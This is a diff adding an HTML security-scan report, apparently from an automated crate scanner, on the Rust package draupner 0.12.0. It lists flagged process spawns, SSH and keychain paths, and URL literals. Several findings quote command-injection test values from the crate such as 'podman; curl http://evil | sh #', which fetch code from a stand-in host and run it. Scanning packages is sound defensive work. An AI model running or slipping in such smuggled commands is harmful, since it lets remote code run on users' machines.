@@ -1,0 +1,494 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Crateward: draupner 0.12.0</title>
+<link rel="stylesheet" href="../static/crateward.css">
+</head>
+<body>
+<header>
+  <a class="brand" href="../index.html">Crateward</a>
+  <nav class="primary" aria-label="Main"><a href="../index.html">Archive</a></nav>
+</header>
+<main>
+
+<div class="report-head">
+  <div class="report-title">
+    <h1>draupner <span class="version">0.12.0</span></h1>
+    <p class="meta">
+      <span class="badge">Done</span>
+      <span class="badge">dynamic on Linux</span>
+      <span class="muted">job 170204</span>
+      <a class="muted" href="https://crates.io/crates/draupner/0.12.0" rel="noreferrer noopener" target="_blank">crates.io</a>
+      <a class="muted" href="170204.cdx.json" download title="CycloneDX SBOM of the crate and its locked dependencies">SBOM</a>
+      <a class="muted" href="170204.vex.cdx.json" download title="Crateward's findings as CycloneDX VEX, pointing into the SBOM">Findings (VEX)</a>
+      
+    </p>
+    <p class="headline">medium severity process_spawn in build_script code (69 places): std::process::Command::new</p>
+  </div>
+  
+  <div class="verdict tone-low">
+    <div class="score">19</div>
+    <div class="level">low</div>
+  </div>
+  
+</div>
+
+
+<div class="decision">
+  <span><b>Automated verdict.</b> Nobody reviewed it. A score is a reason to look closer, not a finding.</span>
+</div>
+
+
+<nav class="toc" aria-label="Sections">
+  
+  <a href="#evidence">Evidence <span class="count">6</span></a>
+  <a href="#behavior">Behavior <span class="count">5</span></a>
+  <a href="#findings">Static findings <span class="count">138</span></a>
+  <a href="#run-check">Run: check</a>
+  <a href="#timeline">Timeline <span class="count">6</span></a>
+</nav>
+
+
+
+<h2 id="evidence">Evidence</h2>
+
+
+<table class="evidence">
+<thead><tr><th class="num">Points</th><th>Signal</th><th>Where</th><th>What</th></tr></thead>
+<tbody>
+
+<tr><td class="num"><span class="points warn">10</span></td><td class="signal"><span class="word">static:process_spawn</span><div class="sub">static · draupner</div></td><td class="mono where"><a href="https://crates.io/crates/draupner/0.12.0/code/build.rs#L28" rel="noreferrer noopener" target="_blank">build.rs:28</a></td><td>medium severity process_spawn in build_script code (69 places): std::process::Command::new</td></tr>
+
+<tr><td class="num"><span class="points low">2</span></td><td class="signal"><span class="word">static:credential_access</span><div class="sub">static · draupner</div></td><td class="mono where"><a href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L160" rel="noreferrer noopener" target="_blank">src/remote.rs:160</a></td><td>medium severity credential_access in library code (3 places): ControlPath=~/.ssh/drup-cm-%C</td></tr>
+
+<tr><td class="num"><span class="points low">2</span></td><td class="signal"><span class="word">static:obfuscated_data</span><div class="sub">static · draupner</div></td><td class="mono where"><a href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_exec.rs#L154" rel="noreferrer noopener" target="_blank">tests/drup_exec.rs:154</a></td><td>medium severity obfuscated_data in test code: cd workspace/feat-foo/api &#38;&#38; DRUP_WORKSPACE_ROOT=workspace DRUP_WORKTREE=workspace/feat-foo/api DRUP_REPO=api DRUP_BRANCH_SANITIZED=feat-foo DRUP_RUNTIME=podman DRUP_REMOTE=1 DRUP_CONNECTION=srv exec …</td></tr>
+
+<tr><td class="num"><span class="points low">2</span></td><td class="signal"><span class="word">static:shell_command</span><div class="sub">static · draupner</div></td><td class="mono where"><a href="https://crates.io/crates/draupner/0.12.0/code/src/caddy.rs#L336" rel="noreferrer noopener" target="_blank">src/caddy.rs:336</a></td><td>medium severity shell_command in library code (20 places): `*.{domain}` doesn&#39;t resolve yet — reach a route with `curl --resolve &#60;host&#62;:{port}:127.0.0.1 https://&#60;host&#62;:{port}`</td></tr>
+
+<tr><td class="num"><span class="points low">2</span></td><td class="signal"><span class="word">static:yara:persistence_locations</span><div class="sub">static · draupner</div></td><td class="mono where"><a href="https://crates.io/crates/draupner/0.12.0/code/src/inject.rs#L840" rel="noreferrer noopener" target="_blank">src/inject.rs:840</a></td><td>medium severity yara:persistence_locations in library code (3 places): Paths and keys used to persist on a developer machine</td></tr>
+
+<tr><td class="num"><span class="points low">1</span></td><td class="signal"><span class="word">static:build_script</span><div class="sub">static · draupner</div></td><td class="mono where"><a href="https://crates.io/crates/draupner/0.12.0/code/build.rs" rel="noreferrer noopener" target="_blank">build.rs</a></td><td>low severity build_script in build_script code: build.rs</td></tr>
+
+</tbody>
+</table>
+
+
+
+
+<h2 id="behavior">Behavior</h2>
+<div class="behavior">
+
+<div><h4>Profile</h4>
+<p class="chips"><code class="chip">static:credential_access</code> <code class="chip">static:obfuscated_data</code> <code class="chip">static:process_spawn</code> <code class="chip">static:shell_command</code> <code class="chip">static:yara:persistence_locations</code> </p></div>
+</div>
+
+<h2 id="findings">Static findings</h2>
+
+<div class="findings">
+<div class="filter" role="radiogroup" aria-label="Severity">
+  <input type="radio" name="severity" id="sev-all" checked><label for="sev-all">All <span class="count">138</span></label>
+  
+  <input type="radio" name="severity" id="sev-medium"><label for="sev-medium" class="tone-medium">medium <span class="count">28</span></label>
+  <input type="radio" name="severity" id="sev-low"><label for="sev-low" class="tone-low">low <span class="count">73</span></label>
+  <input type="radio" name="severity" id="sev-info"><label for="sev-info" class="tone-info">info <span class="count">37</span></label>
+  <span class="muted">13 groups</span>
+</div>
+
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">shell_command</span> <span class="context">library</span> <span class="count">19</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">`*.{domain}` doesn&#39;t resolve yet — reach a route with `curl --resolve &#60;host&#62;:{port}:127.0.0.1 https://&#60;host&#62;:{port}`</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/caddy.rs#L336" rel="noreferrer noopener" target="_blank">src/caddy.rs:336</a> </span></li>
+
+<li><code class="evidence-text">curl --resolve</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/caddy.rs#L913" rel="noreferrer noopener" target="_blank">src/caddy.rs:913</a> </span></li>
+
+<li><code class="evidence-text">podman; curl http://evil | sh #</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/compose.rs#L430" rel="noreferrer noopener" target="_blank">src/compose.rs:430</a> </span></li>
+
+<li><code class="evidence-text">&#39;podman; curl http://evil | sh #&#39;</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/compose.rs#L431" rel="noreferrer noopener" target="_blank">src/compose.rs:431</a> </span></li>
+
+<li><code class="evidence-text">podman; curl evil | sh #</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L730" rel="noreferrer noopener" target="_blank">src/config.rs:730</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L773" rel="noreferrer noopener" target="_blank">src/config.rs:773</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L779" rel="noreferrer noopener" target="_blank">src/config.rs:779</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/probe.rs#L168" rel="noreferrer noopener" target="_blank">src/probe.rs:168</a> </span></li>
+
+<li><code class="evidence-text">podman; curl evil | sh # compose</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L731" rel="noreferrer noopener" target="_blank">src/config.rs:731</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L780" rel="noreferrer noopener" target="_blank">src/config.rs:780</a> </span></li>
+
+<li><code class="evidence-text">&#39;podman; curl evil | sh #&#39; {site}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L734" rel="noreferrer noopener" target="_blank">src/config.rs:734</a> </span></li>
+
+<li><code class="evidence-text">&#39;podman; curl evil | sh #&#39; compose down</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L774" rel="noreferrer noopener" target="_blank">src/config.rs:774</a> </span></li>
+
+<li><code class="evidence-text">&#39;podman; curl evil | sh #&#39; compose down $v</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L781" rel="noreferrer noopener" target="_blank">src/config.rs:781</a> </span></li>
+
+<li><code class="evidence-text">&#39;podman; curl evil | sh #&#39; images --filter</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L782" rel="noreferrer noopener" target="_blank">src/config.rs:782</a> </span></li>
+
+<li><code class="evidence-text">&#39;podman; curl evil | sh #&#39; rmi $imgs</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L783" rel="noreferrer noopener" target="_blank">src/config.rs:783</a> </span></li>
+
+<li><code class="evidence-text">&#39;podman; curl evil | sh #&#39; image prune -f</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L785" rel="noreferrer noopener" target="_blank">src/config.rs:785</a> </span></li>
+
+<li><code class="evidence-text">chmod +x {}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/init.rs#L250" rel="noreferrer noopener" target="_blank">src/ops/init.rs:250</a> </span></li>
+
+<li><code class="evidence-text">&#39;podman; curl evil | sh #&#39; info</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/probe.rs#L169" rel="noreferrer noopener" target="_blank">src/probe.rs:169</a> </span></li>
+
+<li><code class="evidence-text">mkdir -p {b} &#38;&#38; tar -C {b} --warning=no-unknown-keyword -xpf - &#38;&#38; find {b}/.drup-hooks -type f -exec sh -c &#39;for f do head -c2 &#34;$f&#34; | grep -q &#34;^#!&#34; &#38;&#38; chmod +x &#34;$f&#34;; done; exit 0&#39; _ {{}} +</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L263" rel="noreferrer noopener" target="_blank">src/remote.rs:263</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">credential_access</span> <span class="context">library</span> <span class="count">3</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">ControlPath=~/.ssh/drup-cm-%C</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L160" rel="noreferrer noopener" target="_blank">src/remote.rs:160</a> </span></li>
+
+<li><code class="evidence-text">sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain {}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/setup.rs#L152" rel="noreferrer noopener" target="_blank">src/setup.rs:152</a> </span></li>
+
+<li><code class="evidence-text">/Library/Keychains/System.keychain</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/setup.rs#L659" rel="noreferrer noopener" target="_blank">src/setup.rs:659</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">yara_match persistence_locations</span> <span class="context">library</span> <span class="count">3</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">Paths and keys used to persist on a developer machine</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/inject.rs#L840" rel="noreferrer noopener" target="_blank">src/inject.rs:840</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/exec.rs#L134" rel="noreferrer noopener" target="_blank">src/ops/exec.rs:134</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L310" rel="noreferrer noopener" target="_blank">src/remote.rs:310</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">obfuscated_data</span> <span class="context">test</span> <span class="count">1</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">cd workspace/feat-foo/api &#38;&#38; DRUP_WORKSPACE_ROOT=workspace DRUP_WORKTREE=workspace/feat-foo/api DRUP_REPO=api DRUP_BRANCH_SANITIZED=feat-foo DRUP_RUNTIME=podman DRUP_REMOTE=1 DRUP_CONNECTION=srv exec …</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_exec.rs#L154" rel="noreferrer noopener" target="_blank">tests/drup_exec.rs:154</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">process_spawn</span> <span class="context">build_script</span> <span class="count">1</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">std::process::Command::new</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/build.rs#L28" rel="noreferrer noopener" target="_blank">build.rs:28</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">shell_command</span> <span class="context">test</span> <span class="count">1</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">chmod +x</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_remote_offload.rs#L422" rel="noreferrer noopener" target="_blank">tests/drup_remote_offload.rs:422</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-low">
+<summary><span class="badge tone-low">low</span> <span class="kind">process_spawn</span> <span class="context">library</span> <span class="count">49</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">std::process::Command::new</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/compat.rs#L36" rel="noreferrer noopener" target="_blank">src/compat.rs:36</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/compose.rs#L235" rel="noreferrer noopener" target="_blank">src/compose.rs:235</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L246" rel="noreferrer noopener" target="_blank">src/config.rs:246</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/git.rs#L8" rel="noreferrer noopener" target="_blank">src/git.rs:8</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/hooks.rs#L127" rel="noreferrer noopener" target="_blank">src/hooks.rs:127</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/mutagen.rs#L17" rel="noreferrer noopener" target="_blank">src/mutagen.rs:17</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/mutagen.rs#L42" rel="noreferrer noopener" target="_blank">src/mutagen.rs:42</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/mutagen.rs#L66" rel="noreferrer noopener" target="_blank">src/mutagen.rs:66</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/mutagen.rs#L157" rel="noreferrer noopener" target="_blank">src/mutagen.rs:157</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/mutagen.rs#L187" rel="noreferrer noopener" target="_blank">src/mutagen.rs:187</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/mutagen.rs#L215" rel="noreferrer noopener" target="_blank">src/mutagen.rs:215</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/mutagen.rs#L270" rel="noreferrer noopener" target="_blank">src/mutagen.rs:270</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/clean.rs#L116" rel="noreferrer noopener" target="_blank">src/ops/clean.rs:116</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/clean.rs#L134" rel="noreferrer noopener" target="_blank">src/ops/clean.rs:134</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/exec.rs#L105" rel="noreferrer noopener" target="_blank">src/ops/exec.rs:105</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/new.rs#L294" rel="noreferrer noopener" target="_blank">src/ops/new.rs:294</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/new.rs#L307" rel="noreferrer noopener" target="_blank">src/ops/new.rs:307</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/new.rs#L327" rel="noreferrer noopener" target="_blank">src/ops/new.rs:327</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/new.rs#L353" rel="noreferrer noopener" target="_blank">src/ops/new.rs:353</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/new.rs#L418" rel="noreferrer noopener" target="_blank">src/ops/new.rs:418</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/new.rs#L454" rel="noreferrer noopener" target="_blank">src/ops/new.rs:454</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/rm.rs#L94" rel="noreferrer noopener" target="_blank">src/ops/rm.rs:94</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/teardown.rs#L341" rel="noreferrer noopener" target="_blank">src/ops/teardown.rs:341</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/teardown.rs#L350" rel="noreferrer noopener" target="_blank">src/ops/teardown.rs:350</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/teardown.rs#L366" rel="noreferrer noopener" target="_blank">src/ops/teardown.rs:366</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L66" rel="noreferrer noopener" target="_blank">src/remote.rs:66</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L83" rel="noreferrer noopener" target="_blank">src/remote.rs:83</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L167" rel="noreferrer noopener" target="_blank">src/remote.rs:167</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L214" rel="noreferrer noopener" target="_blank">src/remote.rs:214</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L252" rel="noreferrer noopener" target="_blank">src/remote.rs:252</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L509" rel="noreferrer noopener" target="_blank">src/remote.rs:509</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/setup.rs#L92" rel="noreferrer noopener" target="_blank">src/setup.rs:92</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/setup.rs#L375" rel="noreferrer noopener" target="_blank">src/setup.rs:375</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/setup.rs#L520" rel="noreferrer noopener" target="_blank">src/setup.rs:520</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/setup.rs#L539" rel="noreferrer noopener" target="_blank">src/setup.rs:539</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/supervise.rs#L357" rel="noreferrer noopener" target="_blank">src/supervise.rs:357</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/supervise.rs#L485" rel="noreferrer noopener" target="_blank">src/supervise.rs:485</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/supervise.rs#L498" rel="noreferrer noopener" target="_blank">src/supervise.rs:498</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/supervise.rs#L515" rel="noreferrer noopener" target="_blank">src/supervise.rs:515</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/supervise.rs#L538" rel="noreferrer noopener" target="_blank">src/supervise.rs:538</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/supervise.rs#L554" rel="noreferrer noopener" target="_blank">src/supervise.rs:554</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/supervise.rs#L600" rel="noreferrer noopener" target="_blank">src/supervise.rs:600</a> </span></li>
+
+<li><code class="evidence-text">std::process::Command</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/git.rs#L7" rel="noreferrer noopener" target="_blank">src/git.rs:7</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/hooks.rs#L102" rel="noreferrer noopener" target="_blank">src/hooks.rs:102</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/hooks.rs#L126" rel="noreferrer noopener" target="_blank">src/hooks.rs:126</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L63" rel="noreferrer noopener" target="_blank">src/remote.rs:63</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L80" rel="noreferrer noopener" target="_blank">src/remote.rs:80</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L166" rel="noreferrer noopener" target="_blank">src/remote.rs:166</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/remote.rs#L508" rel="noreferrer noopener" target="_blank">src/remote.rs:508</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-low">
+<summary><span class="badge tone-low">low</span> <span class="kind">process_spawn</span> <span class="context">test</span> <span class="count">19</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">std::process::Command::new</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/common/mod.rs#L134" rel="noreferrer noopener" target="_blank">tests/common/mod.rs:134</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/common/mod.rs#L164" rel="noreferrer noopener" target="_blank">tests/common/mod.rs:164</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/common/mod.rs#L295" rel="noreferrer noopener" target="_blank">tests/common/mod.rs:295</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_claude.rs#L48" rel="noreferrer noopener" target="_blank">tests/drup_claude.rs:48</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_compose.rs#L9" rel="noreferrer noopener" target="_blank">tests/drup_compose.rs:9</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_copy.rs#L57" rel="noreferrer noopener" target="_blank">tests/drup_copy.rs:57</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_init.rs#L177" rel="noreferrer noopener" target="_blank">tests/drup_init.rs:177</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_inject.rs#L299" rel="noreferrer noopener" target="_blank">tests/drup_inject.rs:299</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_new.rs#L16" rel="noreferrer noopener" target="_blank">tests/drup_new.rs:16</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_new.rs#L140" rel="noreferrer noopener" target="_blank">tests/drup_new.rs:140</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_remote_set.rs#L354" rel="noreferrer noopener" target="_blank">tests/drup_remote_set.rs:354</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_supervise.rs#L26" rel="noreferrer noopener" target="_blank">tests/drup_supervise.rs:26</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_supervise.rs#L39" rel="noreferrer noopener" target="_blank">tests/drup_supervise.rs:39</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_supervise.rs#L86" rel="noreferrer noopener" target="_blank">tests/drup_supervise.rs:86</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_supervise.rs#L121" rel="noreferrer noopener" target="_blank">tests/drup_supervise.rs:121</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_supervise.rs#L203" rel="noreferrer noopener" target="_blank">tests/drup_supervise.rs:203</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_supervise.rs#L328" rel="noreferrer noopener" target="_blank">tests/drup_supervise.rs:328</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_supervise.rs#L369" rel="noreferrer noopener" target="_blank">tests/drup_supervise.rs:369</a> </span></li>
+
+<li><code class="evidence-text">std::process::Command</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_new.rs#L15" rel="noreferrer noopener" target="_blank">tests/drup_new.rs:15</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-low">
+<summary><span class="badge tone-low">low</span> <span class="kind">network_access</span> <span class="context">test</span> <span class="count">3</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">std::net::TcpListener::bind</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/common/mod.rs#L21" rel="noreferrer noopener" target="_blank">tests/common/mod.rs:21</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_supervise.rs#L180" rel="noreferrer noopener" target="_blank">tests/drup_supervise.rs:180</a> </span></li>
+
+<li><code class="evidence-text">std::net::TcpStream</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/common/mod.rs#L51" rel="noreferrer noopener" target="_blank">tests/common/mod.rs:51</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-low">
+<summary><span class="badge tone-low">low</span> <span class="kind">build_script</span> <span class="context">build_script</span> <span class="count">1</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">build.rs</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/build.rs" rel="noreferrer noopener" target="_blank">build.rs</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-low">
+<summary><span class="badge tone-low">low</span> <span class="kind">network_access</span> <span class="context">library</span> <span class="count">1</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">std::net::TcpListener::bind</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ports.rs#L227" rel="noreferrer noopener" target="_blank">src/ports.rs:227</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-info">
+<summary><span class="badge tone-info">info</span> <span class="kind">url_literal</span> <span class="context">library</span> <span class="count">24</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">http://127.0.0.1:{}{path}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/caddy.rs#L38" rel="noreferrer noopener" target="_blank">src/caddy.rs:38</a> </span></li>
+
+<li><code class="evidence-text">`*.{domain}` doesn&#39;t resolve yet — reach a route with `curl --resolve &#60;host&#62;:{port}:127.0.0.1 https://&#60;host&#62;:{port}`</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/caddy.rs#L336" rel="noreferrer noopener" target="_blank">src/caddy.rs:336</a> </span></li>
+
+<li><code class="evidence-text">`*.{domain}` doesn&#39;t resolve yet — point it at an address this server is reachable at (see `server-setup/&#60;distro&#62;.sh --address`), then reach a route on `https://&#60;host&#62;:{port}`</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/caddy.rs#L340" rel="noreferrer noopener" target="_blank">src/caddy.rs:340</a> </span></li>
+
+<li><code class="evidence-text">http://127.0.0.1:{}/config/</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/caddy.rs#L933" rel="noreferrer noopener" target="_blank">src/caddy.rs:933</a> </span></li>
+
+<li><code class="evidence-text">podman; curl http://evil | sh #</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/compose.rs#L430" rel="noreferrer noopener" target="_blank">src/compose.rs:430</a> </span></li>
+
+<li><code class="evidence-text">&#39;podman; curl http://evil | sh #&#39;</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/compose.rs#L431" rel="noreferrer noopener" target="_blank">src/compose.rs:431</a> </span></li>
+
+<li><code class="evidence-text">https://feat-x.web.myapp.test</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/compose.rs#L533" rel="noreferrer noopener" target="_blank">src/compose.rs:533</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/compose.rs#L607" rel="noreferrer noopener" target="_blank">src/compose.rs:607</a> </span></li>
+
+<li><code class="evidence-text">APP_URL: &#34;https://feat-x.web.myapp.test&#34;</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/compose.rs#L537" rel="noreferrer noopener" target="_blank">src/compose.rs:537</a> </span></li>
+
+<li><code class="evidence-text">      APP_URL: &#34;https://feat-x.web.myapp.test&#34;\u{a}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/compose.rs#L616" rel="noreferrer noopener" target="_blank">src/compose.rs:616</a> </span></li>
+
+<li><code class="evidence-text">{&#34;repos&#34;:[{\u{a}                &#34;name&#34;:&#34;api&#34;,&#34;kind&#34;:&#34;container&#34;,\u{a}                &#34;services&#34;:{&#34;app&#34;:{&#34;http&#34;:&#34;api&#34;,&#34;port&#34;:80},&#34;mysql&#34;:{&#34;port&#34;:3306},&#34;redis&#34;:{&#34;port&#34;:6379,&#34;shared&#34;:true}},\u{a}        …</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L1059" rel="noreferrer noopener" target="_blank">src/config.rs:1059</a> </span></li>
+
+<li><code class="evidence-text">https://${DRUP_HOST_app}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/config.rs#L1081" rel="noreferrer noopener" target="_blank">src/config.rs:1081</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/inject.rs#L857" rel="noreferrer noopener" target="_blank">src/inject.rs:857</a> </span></li>
+
+<li><code class="evidence-text">https://myapp.localhost:${DRUP_PORT_app.web}/x</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/inject.rs#L615" rel="noreferrer noopener" target="_blank">src/inject.rs:615</a> </span></li>
+
+<li><code class="evidence-text">https://myapp.localhost:20008/x</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/inject.rs#L616" rel="noreferrer noopener" target="_blank">src/inject.rs:616</a> </span></li>
+
